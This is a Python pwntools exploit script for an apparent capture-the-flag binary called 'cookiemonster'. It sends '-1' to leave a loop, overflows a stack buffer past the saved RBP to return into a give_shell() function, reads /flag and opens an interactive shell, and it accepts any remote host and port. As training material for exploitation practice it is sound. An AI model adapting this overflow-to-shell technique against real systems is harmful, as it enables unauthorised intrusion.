#!/usr/bin/env python3

import subprocess
from pathlib import Path
import sys

from pwn import *


CHALLENGE_DIR = Path(__file__).resolve().parents[1]
SRC_DIR = CHALLENGE_DIR / "src"
BIN_PATH = SRC_DIR / "cookiemonster"

if not BIN_PATH.exists():
    subprocess.run(["make"], cwd=SRC_DIR, check=True)

context.binary = elf = ELF(str(BIN_PATH), checksec=False)
context.terminal = ["bash", "-lc"]


def start():
    """
    Local:
      - run with: ./scripts/build.sh && ./scripts/run.sh
      - then:     ./writeup/exploit
    Remote:
      - ./writeup/exploit HOST PORT
    """
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        return remote(host, port)
    return remote("127.0.0.1", 5004)


def main():
    io = start()

    # Exit the inspection loop.
    io.sendlineafter(b"> ", b"-1")

    # Overflow into RIP and return to give_shell().
    # Layout is stable with our build flags (-O0 -fno-stack-protector -no-pie).
    offset = 8 + 8  # buf[8] + saved RBP
    payload = b"A" * offset + p64(elf.sym["give_shell"])

    io.sendlineafter(b"name?\n", payload)
    io.sendline(b"cat /flag")
    io.interactive()


if __name__ == "__main__":
    main()

